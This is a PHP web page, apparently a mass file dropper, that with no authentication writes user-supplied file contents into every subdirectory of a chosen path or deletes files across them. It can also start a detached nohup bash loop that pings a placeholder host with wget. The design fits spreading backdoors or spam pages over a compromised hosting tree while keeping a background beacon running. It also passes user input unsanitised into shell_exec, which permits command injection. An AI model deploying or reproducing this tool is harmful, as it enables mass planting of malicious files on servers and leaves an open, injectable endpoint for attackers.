<?php
// Fungsi untuk menjalankan wget setiap beberapa detik menggunakan nohup
function runWgetLoop($url, $intervalSeconds = 10) {
    $cmd = "nohup bash -c 'while true; do wget -q --spider \"$url\"; sleep $intervalSeconds; done' > /dev/null 2>&1 &";
    shell_exec($cmd);
}

// Fungsi untuk menghitung jumlah file di direktori
function countFilesInDirectory($directory) {
    $files = array_diff(scandir($directory), ['.', '..']);
    return count(array_filter($files, fn($file) => is_file($directory . DIRECTORY_SEPARATOR . $file)));
}

// Menangani form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $targetDir = $_POST['target_dir'] ?? '';
    $enableWget = isset($_POST['enable_wget']);
    $wgetInterval = $_POST['wget_interval'] ?? 10;
    $fileLimit = $_POST['file_limit'] ?? 0; // Ambil file limit

    $fileData = $_POST['file_data'] ?? []; // Data file (nama dan konten)

    if ($enableWget) {
        $urlToCheck = "http://yourserver.com/your-file-check-url";
        runWgetLoop($urlToCheck, $wgetInterval);
    }

    if ($action === 'distribute' && !empty($targetDir) && !empty($fileData)) {
        $directories = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        $success = [];
        $failed = [];
        foreach ($fileData as $data) {
            $fileName = $data['name'] ?? '';
            $fileContent = $data['content'] ?? '';
            if (empty($fileName) || empty($fileContent)) {
                continue;
            }

            foreach ($directories as $dir) {
                if ($dir->isDir()) {
                    $currentDir = $dir->getPathname();
                    if ($fileLimit > 0 && countFilesInDirectory($currentDir) >= $fileLimit) {
                        continue;
                    }
                    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
                    if (file_put_contents($filePath, $fileContent) !== false) {
                        $success[] = $filePath;
                    } else {
                        $failed[] = $filePath;
                    }
                }
            }
        }

        echo "<h3>Process Complete - File Distribution</h3>";
        echo "<p><strong>Success:</strong></p><ul>";
        foreach ($success as $path) echo "<li>$path</li>";
        echo "</ul>";

        echo "<p><strong>Failed:</strong></p><ul>";
        foreach ($failed as $path) echo "<li>$path</li>";
        echo "</ul>";
        exit;
    } elseif ($action === 'delete' && !empty($targetDir) && !empty($fileData)) {
        $deleted = [];
        $notFound = [];

        foreach ($fileData as $data) {
            $fileName = $data['name'] ?? '';
            if (empty($fileName)) {
                continue;
            }

            $directories = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($directories as $dir) {
                if ($dir->isDir()) {
                    $filePath = $dir->getPathname() . DIRECTORY_SEPARATOR . $fileName;
                    if (file_exists($filePath)) {
                        if (unlink($filePath)) {
                            $deleted[] = $filePath;
                        }
                    } else {
                        $notFound[] = $filePath;
                    }
                }
            }
        }

        echo "<h3>Process Complete - File Deletion</h3>";
        echo "<p><strong>Deleted:</strong></p><ul>";
        foreach ($deleted as $path) echo "<li>$path</li>";
        echo "</ul>";

        echo "<p><strong>Not Found:</strong></p><ul>";
        foreach ($notFound as $path) echo "<li>$path</li>";
        echo "</ul>";
        exit;
    } else {
        echo "<p style='color: red;'>Semua field wajib diisi!</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Distributor & Deletion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f4f4f9;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            margin-bottom: 15px;
            border-collapse: collapse;
        }
        table th, table td {
            border: 1px solid #ddd;
            padding: 8px;
        }
        input, textarea, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
        }
        button {
            background: #007bff;
            color: white;
            border: none;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>PHP File Distributor & Deletion</h1>
    <form method="POST">
        <label for="target_dir">Target Directory:</label>
        <input type="text" id="target_dir" name="target_dir" placeholder="Enter base directory path" required>

        <label>File Details:</label>
        <table>
            <thead>
                <tr>
                    <th>File Name</th>
                    <th>File Content</th>
                </tr>
            </thead>
            <tbody id="fileDataTable">
                <tr>
                    <td><input type="text" name="file_data[0][name]" placeholder="File Name" required></td>
                    <td><textarea name="file_data[0][content]" placeholder="File Content" required></textarea></td>
                </tr>
            </tbody>
        </table>
        <button type="button" onclick="addFileRow()">Add File</button>

        <label for="file_limit">File Limit Per Directory:</label>
        <input type="number" id="file_limit" name="file_limit" min="0" value="0" placeholder="0 for unlimited">

        <label for="enable_wget">Enable Background Check (Wget):</label>
        <input type="checkbox" id="enable_wget" name="enable_wget" value="1">

        <label for="wget_interval">Interval for Wget (in seconds):</label>
        <input type="number" id="wget_interval" name="wget_interval" min="1" value="10" required>

        <button type="submit" name="action" value="distribute">Distribute Files</button>
        <button type="submit" name="action" value="delete">Delete Files</button>
    </form>
</div>

<script>
    function addFileRow() {
        const table = document.getElementById('fileDataTable');
        const rowCount = table.rows.length;
        const newRow = table.insertRow();

        newRow.innerHTML = `
            <td><input type="text" name="file_data[${rowCount}][name]" placeholder="File Name" required></td>
            <td><textarea name="file_data[${rowCount}][content]" placeholder="File Content" required></textarea></td>
        `;
    }
</script>
</body>
</html>
